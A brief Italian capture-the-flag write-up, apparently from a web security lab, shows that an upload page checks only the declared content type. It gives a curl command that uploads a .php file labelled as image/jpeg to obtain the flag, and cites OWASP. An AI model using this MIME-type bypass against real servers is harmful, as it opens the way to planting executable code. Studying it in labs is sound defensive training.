

Navigando su `http://{{IP_ADDRESS}}/?page=upload ` con i DevTool notiamo che non viene fatto un vero controllo sul file
ma solo sul tipo di file che si sta dichiarando di uploadare, questo ovviamente non va bene e infatti

se carichiamo un qualsiasi file dichiarando un tipo diverso con curl
```
curl \
-X POST \
-H 'Content-Type: multipart/form-data' \
-F 'uploaded=@test.php;type=image/jpeg' \
-F 'Upload=Upload' \
'http://{{IP_ADDRESS}}/?page=upload'
```

Otteniamo la flag nella risposta

NB: stiamo caricando un file .php ma nel type spefichiamo image/jpeg

Documentazione in merito :

[OWASP_uncheckedUpload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
